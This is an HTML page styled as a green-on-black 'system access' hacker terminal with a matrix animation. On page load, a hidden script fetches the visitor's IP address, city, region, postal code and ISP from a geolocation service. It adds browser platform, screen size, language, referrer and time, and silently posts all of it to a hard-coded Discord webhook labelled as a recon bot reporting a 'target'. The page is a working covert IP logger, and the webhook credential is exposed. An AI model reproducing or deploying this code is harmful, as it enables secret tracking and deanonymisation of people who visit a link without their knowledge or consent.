<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FDF | SYSTEM ACCESS</title>
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #matrix-canvas {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            opacity: 0.3;
        }

        .terminal {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 800px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.4);
            border-radius: 5px;
        }

        .header {
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            margin-bottom: 20px;
            font-size: 1.5em;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .log-line {
            margin: 5px 0;
            font-size: 14px;
            opacity: 0;
            animation: fadeIn 0.1s forwards;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            border: 1px solid #00ff00;
            margin-top: 20px;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: #00ff00;
            width: 0%;
            transition: width 0.5s;
        }

        .cursor {
            display: inline-block;
            width: 10px;
            height: 18px;
            background: #00ff00;
            animation: blink 1s infinite;
            vertical-align: middle;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>

    <canvas id="matrix-canvas"></canvas>

    <div class="terminal">
        <div class="header">FDF Central Intelligence | Node: v3.4.1</div>
        <div id="output"></div>
        <div class="progress-bar">
            <div id="progress" class="progress-fill"></div>
        </div>
        <div style="margin-top: 15px;">
            <span id="status">INITIALIZING...</span><span class="cursor"></span>
        </div>
    </div>

    <script>
        // --- КОНФИГУРАЦИЯ ---
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480583217282289825/jlMeiNkP_LLyS9N9NC6GnEg7-YGKa-p2hRgUo8cP2DdK2Gq3HCeBfAap1dAD5OSGLrjO";

        // --- ЛОГИКА ОТПРАВКИ ---
        async function reportToDiscord() {
            try {
                // Получение расширенных данных через API
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const embed = {
                    username: "FDF RECON BOT",
                    avatar_url: "https://i.imgur.com/8nL8z6n.png",
                    embeds: [{
                        title: "🎯 ЦЕЛЬ ОБНАРУЖЕНА НА САЙТЕ",
                        color: 5763719,
                        fields: [
                            { name: "🌐 IP Адрес", value: `\`${data.ip}\``, inline: true },
                            { name: "📍 Локация", value: `${data.city}, ${data.region} (${data.country_name})`, inline: true },
                            { name: "📮 Индекс", value: data.postal || "N/A", inline: true },
                            { name: "🏢 Провайдер", value: data.org, inline: false },
                            { name: "💻 Система", value: navigator.platform, inline: true },
                            { name: "📏 Экран", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                            { name: "🌍 Язык", value: navigator.language, inline: true },
                            { name: "🔗 Реферер", value: document.referrer || "Прямой переход", inline: false },
                            { name: "🕒 Время", value: new Date().toLocaleString(), inline: false }
                        ],
                        footer: { text: "FDF Network Monitor | Stealth Mode" },
                        timestamp: new Date()
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            } catch (error) {
                console.error("FDF Error: Data transmission failed.");
            }
        }

        // --- ВИЗУАЛЬНЫЕ ЭФФЕКТЫ ---
        const output = document.getElementById('output');
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');

        const lines = [
            "> Establishing secure connection...",
            "> Bypassing firewall...",
            "> Handshake successful.",
            "> Scanning local environment...",
            "> Hardware ID: " + Math.random().toString(36).substr(2, 9).toUpperCase(),
            "> Extracting metadata...",
            "> Connection encrypted (AES-256).",
            "> Ready for command."
        ];

        let lineIdx = 0;
        function typeLines() {
            if (lineIdx < lines.length) {
                const div = document.createElement('div');
                div.className = 'log-line';
                div.innerText = lines[lineIdx];
                output.appendChild(div);
                lineIdx++;
                progress.style.width = (lineIdx / lines.length) * 100 + "%";
                setTimeout(typeLines, 600);
            } else {
                status.innerText = "ACCESS GRANTED. DATA SYNCED.";
            }
        }

        // --- MATRIX BACKGROUND ---
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) drops[i] = 1;

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0";
            ctx.font = fontSize + "px arial";
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }

        window.onload = () => {
            reportToDiscord();
            typeLines();
            setInterval(drawMatrix, 33);
        };
    </script>
</body>
</html>
